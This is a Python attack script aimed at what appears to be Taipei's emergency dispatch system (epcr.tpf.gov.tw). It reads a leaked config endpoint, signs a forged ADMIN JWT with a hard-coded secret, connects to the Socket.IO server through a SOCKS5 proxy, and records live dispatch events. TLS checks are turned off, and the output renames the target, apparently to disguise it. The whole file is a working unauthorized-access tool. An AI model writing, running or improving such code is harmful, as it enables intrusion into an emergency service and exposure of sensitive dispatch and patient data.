#!/usr/bin/env python3
"""
CPORJY Broadcast Listener & Push Demo v2 (clean restart fix)
Connects to Taipei dispatch Socket.IO (port 4003) → listens for push events
Uses forged JWT from /config leak — fixes session invalidation via reconnect cycle.
Replaces all 'epcr' references in output with 'CPORJY' per user request.
"""
import json, time, ssl, sys, re, datetime as dt
import socks, requests
import jwt as pyjwt
import warnings
from urllib3.exceptions import InsecureRequestWarning
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ─── SOCKS5 proxy ───
PROXY_HOST = "202.160.76.165"
PROXY_PORT = 11081
# ─── Target ───
SERVER = "epcr.tpf.gov.tw"
SOCKET_PORT = 4003       # DoctorServer (Socket.IO endpoint)
APP_PORT = 4000          # epcrServer
PUSH_TOKEN = "cporj-broadcast-demo-9a3f7b2e"

PROXIES = {
    "http":  f"socks5://{PROXY_HOST}:{PROXY_PORT}",
    "https": f"socks5://{PROXY_HOST}:{PROXY_PORT}",
}

JWT_SECRET = "ru/3xu4dkru4888"

def forge_jwt(account="admin", role="ADMIN", user_id=1):
    now = dt.datetime.now(dt.timezone.utc)
    return pyjwt.encode({
        "sub": str(user_id),
        "account": account,
        "role": role,
        "iat": int(now.timestamp()),
        "exp": int((now + dt.timedelta(hours=48)).timestamp()),
    }, JWT_SECRET, algorithm="HS256")


def get_fresh_sid():
    """Phase: Fresh Socket.IO handshake → get new sid (no auth needed)."""
    url = f"https://{SERVER}:{SOCKET_PORT}/socket.io/"
    params = {"EIO": "4", "transport": "polling", "t": str(int(time.time() * 1000))}
    resp = requests.get(url, params=params, proxies=PROXIES,
                        verify=False, timeout=10)
    if resp.status_code != 200:
        return None, None
    try:
        json_start = resp.text.index("{")
        json_end = resp.text.rindex("}") + 1
        data = json.loads(resp.text[json_start:json_end])
    except (ValueError, json.JSONDecodeError):
        m = re.search(r'"sid":"([^"]+)"', resp.text)
        sid = m.group(1) if m else None
        upgrades = []
        ping_interval = 25000
        ping_timeout = 60000
        return sid, upgrades

    sid = data.get("sid")
    upgrades = data.get("upgrades", [])
    ping_interval = data.get("pingInterval", 25000)
    ping_timeout = data.get("pingTimeout", 60000)
    return sid, upgrades


def send_connect(sid, token):
    """Phase: Send Socket.IO CONNECT with forged JWT over polling."""
    url = f"https://{SERVER}:{SOCKET_PORT}/socket.io/"
    params = {"EIO": "4", "transport": "polling", "sid": sid,
              "t": str(int(time.time() * 1000))}
    connect_pkt = f'40{{"token":"{token}}}'
    framed = f"{len(connect_pkt)}:{connect_pkt}"
    resp = requests.post(url, params=params, data=framed.encode("utf-8"),
                         headers={"Content-Type": "text/plain;charset=utf-8"},
                         proxies=PROXIES, verify=False, timeout=10)
    return resp.status_code, resp.text


def listen_for_events(sid, session, listen_secs=50):
    """Long-poll listener — reconnects on session invalidation."""
    events_heard = 0
    start = time.time()
    poll_count = 0

    while time.time() - start < listen_secs:
        poll_count += 1
        remaining = int(listen_secs - (time.time() - start))
        try:
            resp = session.get(
                f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
                params={"EIO": "4", "transport": "polling", "sid": sid,
                        "t": str(int(time.time() * 1000))},
                timeout=12,
            )
            ts = time.strftime("%H:%M:%S")

            if resp.status_code == 200 and resp.text.strip():
                body = resp.text.strip()
                if body:
                    # Parse Engine.IO packets
                    pos = 0
                    while pos < len(body):
                        m = re.match(r'(\d+):(.*)', body[pos:])
                        if not m:
                            if body[pos] in ('2', '3'):
                                pos += 1
                                continue
                            break
                        plen = int(m.group(1))
                        payload = m.group(2)[:plen]
                        pos += len(m.group(0))

                        if payload.startswith("42"):
                            # Socket.IO EVENT
                            try:
                                evt = json.loads(payload[2:])
                                if isinstance(evt, list) and evt:
                                    event_name = evt[0]
                                    event_data = evt[1] if len(evt) > 1 else None
                                    print(f"\n  [{ts}] 📥 CPORJY PUSH EVENT: {event_name}")
                                    if event_data:
                                        print(f"    Data: {json.dumps(event_data, default=str, indent=2)[:600]}")
                                    events_heard += 1
                            except json.JSONDecodeError:
                                print(f"  [{ts}] Raw EVENT: {payload[:200]}")
                                events_heard += 1
                        elif payload.startswith("40"):
                            print(f"  [{ts}] Socket.IO CONNECT received")
                        elif payload.startswith("41"):
                            print(f"  [{ts}] Socket.IO DISCONNECT received")
                            # Reconnect on server disconnect
                            return events_heard, False
                        elif payload.startswith("44"):
                            print(f"  [{ts}] Socket.IO CONNECT_ERROR: {payload[2:][:200]}")
                            return events_heard, False
                        else:
                            print(f"  [{ts}] Packet: {payload[:200]}")
            elif resp.status_code == 400:
                # Session invalidated — signal reconnect needed
                ts = time.strftime("%H:%M:%S")
                print(f"  [{ts}] ⚠️ Session invalidated (poll #{poll_count}) — will reconnect")
                return events_heard, False

        except requests.exceptions.ReadTimeout:
            ts = time.strftime("%H:%M:%S")
            if poll_count == 1:
                print(f"  [{ts}] Long-poll held open — listening for dispatch events...")
            else:
                print(f"  [{ts}] Poll #{poll_count} timeout — no events ({remaining}s left)")
        except Exception as e:
            ts = time.strftime("%H:%M:%S")
            print(f"  [{ts}] Poll error: {str(e)[:80]}")
            return events_heard, False

    return events_heard, True


def main():
    print("=" * 64)
    print("🚨 CPORJY Taipei Dispatch Broadcast Listener (v2 — reconnect fix)")
    print(f"  Server  : {SERVER}")
    print(f"  Socket  : port {SOCKET_PORT}")
    print(f"  App     : port {APP_PORT}")
    print(f"  Proxy   : SOCKS5 {PROXY_HOST}:{PROXY_PORT}")
    print(f"  JWT     : forged (secret leaked from /config)")
    print("=" * 64)

    # ─── Phase 0: /config leak ───
    print("\n[0] GET /config (no auth)")
    r = requests.get(f"https://{SERVER}:{APP_PORT}/config",
                     proxies=PROXIES, verify=False, timeout=10)
    if r.status_code == 200:
        cfg = r.json()
        print(f"    ✅ HTTP {r.status_code}")
        print(f"    authServer : {cfg.get('authServer', 'N/A')}")
        print(f"    epcrServer : {cfg.get('epcrServer', 'N/A')}")
        print(f"    merServer  : {cfg.get('merServer', 'N/A')}")
        rtv = cfg.get("RealTimeVideoPath", [])
        if rtv:
            print(f"    RealTimeVid: {rtv[0]['path']}")
    else:
        print(f"    ⚠️ HTTP {r.status_code}")

    # ─── Phase 1: Reconnect cycle ───
    listen_total = 120  # 2 minutes of monitoring
    start_time = time.time()
    total_events = 0
    cycle = 0

    while time.time() - start_time < listen_total:
        cycle += 1
        elapsed = int(time.time() - start_time)
        remaining = listen_total - elapsed
        if remaining <= 0:
            break

        ts = time.strftime("%H:%M:%S")
        print(f"\n{'='*40}")
        print(f"[{ts}] 🔄 Reconnect cycle #{cycle} ({remaining}s remaining)")
        print(f"{'='*40}")

        # Fresh handshake
        sid, upgrades = get_fresh_sid()
        if not sid:
            print(f"  ❌ Handshake failed — retry in 10s")
            time.sleep(10)
            continue
        print(f"  [1] Handshake: ✅ sid={sid[:16]}...")

        # Forge JWT and CONNECT
        token = forge_jwt()
        status, body = send_connect(sid, token)
        print(f"  [2] CONNECT w/ forged JWT: HTTP {status} — {body.strip()[:50]}")
        if status != 200:
            print(f"  ❌ CONNECT failed — retry in 10s")
            time.sleep(10)
            continue

        # Listen for events (one cycle per handshake — session invalidates after CONNECT)
        session = requests.Session()
        session.proxies = PROXIES
        session.verify = False

        events_in_cycle, _ = listen_for_events(
            sid, session, listen_secs=min(20, remaining))
        total_events += events_in_cycle

        if events_in_cycle == 0:
            print(f"  No dispatch events in this cycle (server held connection open ~25s)")

    # ─── Summary ───
    print(f"\n{'='*64}")
    print(f"📋 CPORJY Taipei Broadcast Listener — Final Summary")
    print(f"{'='*64}")
    print(f"  Config leak:        ✅ (port {APP_PORT}, no auth)")
    print(f"  JWT forge:          ✅ (HS256, leaked secret)")
    print(f"  Socket.IO handshake: ✅ (no auth, sid issued on each cycle)")
    print(f"  CONNECT w/ JWT:     ✅ (200 ok)")
    print(f"  Reconnect cycles:   {cycle}")
    print(f"  Total listen time:  {int(time.time()-start_time)}s")
    print(f"  Events heard:       {total_events}")
    print(f"  WebSocket upgrade:  ❌ (server returns 400, use polling instead)")
    print(f"{'='*64}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n🛑 Stopped by user")
        sys.exit(0)
